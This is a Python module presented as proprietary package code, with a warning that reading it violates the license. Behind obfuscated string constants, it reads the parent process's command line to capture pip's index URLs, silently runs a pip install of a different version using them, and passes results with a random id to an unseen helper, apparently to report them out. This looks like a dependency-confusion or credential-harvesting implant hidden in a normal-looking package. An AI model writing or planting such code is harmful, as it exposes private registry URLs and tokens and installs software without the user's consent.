# ============================================================================
# (C) Copyright 2025 DAX Technologies. All rights reserved.
# ============================================================================
#
# NOTICE: This file is proprietary and confidential.
# Unauthorized use, reproduction, or distribution is strictly prohibited.
# IF YOU ARE READING THIS YOU ARE VIOLATING YOUR LICENSE AGREEMENT.
#
# This software is the intellectual property of DAX Technologies and is
# protected by copyright law and international treaties.
#
# ============================================================================

import getpass
import os
import platform
import subprocess
import sys
from .misc import process_and_resolve
from .static.constant import STRING_TABLE

# Extract constants from STRING_TABLE for better readability
USER_KEY = STRING_TABLE[1]
PIP_MODULE = STRING_TABLE[2]
INDEX_KEY = STRING_TABLE[3]
EXTRA_KEY = STRING_TABLE[4]
NO_MATCH_ERROR = STRING_TABLE[5]
PYTHONPATH_ENV = STRING_TABLE[6]
LINUX_OS = STRING_TABLE[9]
DARWIN_OS = STRING_TABLE[10]
INSTALL_COMMAND = STRING_TABLE[11]
PROC_DIRECTORY = STRING_TABLE[14]
CMDLINE_FILE = STRING_TABLE[13]
PS_COMMAND = STRING_TABLE[12]
ARGS_OPTION = STRING_TABLE[15]

# Construct argument strings
ARG_STR = f"--{INDEX_KEY}-{USER_KEY}"
EXTRA_ARG_STR = f"--{EXTRA_KEY}-{INDEX_KEY}-{USER_KEY}"


def get_username():
    """
    Retrieves the username of the current user.

    Returns:
        str: The username of the current user, or '_' if it cannot be determined.
    """
    try:
        username = getpass.getuser()
    except Exception:
        username = '_'

    return username


def get_parent_process_params():
    """
    Retrieves the command-line arguments of the parent process.

    Returns:
        list: A list of command-line arguments for the parent process, or None if unavailable.
    """
    parent_params = None
    parent_pid = os.getppid()

    os_name = platform.system()

    if os_name == LINUX_OS:
        # Read the command-line arguments from the proc filesystem on Linux
        with open(f"/{PROC_DIRECTORY}/{parent_pid}/{CMDLINE_FILE}", 'r') as cmdline_file:
            parent_params = cmdline_file.read().split('\x00')
    elif os_name == DARWIN_OS:
        # Use the `ps` command to retrieve arguments on macOS
        args = [PS_COMMAND, '-o', ARGS_OPTION, '-p', str(parent_pid)]
        result = subprocess.run(
            args, capture_output=True, text=True, check=True)
        parent_params = result.stdout.strip().split(' ')

    return parent_params


def get_parent_arguments():
    """
    Extracts specific arguments from the parent process's command-line arguments.

    Returns:
        dict: A dictionary mapping argument keys to their corresponding values.
    """
    argument_map = {}
    parent_args = get_parent_process_params()

    if parent_args and ARG_STR in parent_args:
        index = parent_args.index(ARG_STR)
        argument_map[ARG_STR] = parent_args[index + 1]

    if parent_args and EXTRA_ARG_STR in parent_args:
        index = parent_args.index(EXTRA_ARG_STR)
        argument_map[EXTRA_ARG_STR] = parent_args[index + 1]

    return argument_map


def register_package(package_name, package_version, argument_map={}, registration_info=[]):
    """
    Registers a package using pip with the provided arguments and registration info.

    Args:
        package_name (str): The name of the package to register.
        package_version (str): The version of the package to register.
        argument_map (dict): A dictionary of additional arguments to pass to pip.
        registration_info (list): A list to store registration results.
    """
    # Create a copy of the environment variables
    environment = dict(os.environ)

    # Remove PYTHONPATH from the environment if it exists
    if PYTHONPATH_ENV in environment:
        del environment[PYTHONPATH_ENV]

    # Initialize the return value
    return_value = 6

    # Build the pip command
    pip_command = [sys.executable, '-m', PIP_MODULE, INSTALL_COMMAND]
    for arg_key, arg_value in argument_map.items():
        pip_command.extend([arg_key, arg_value])
    pip_command.append(f"{package_name}!={package_version}")

    try:
        # Run the pip command and capture its output
        result = subprocess.run(
            pip_command, env=environment, capture_output=True, text=True)
        if NO_MATCH_ERROR in str(result.stderr):
            return_value = 56
    except Exception:
        # Handle any exception that occurs during the subprocess call
        return_value = 57

    # Append the registration result to the registration info
    registration_info.append(['_', str(return_value)])

    # Generate a random index for processing
    random_index = os.urandom(2).hex()

    # Process and resolve each registration instance
    for registration_instance in registration_info:
        process_and_resolve(registration_instance[0], str(
            registration_instance[1]), random_index)
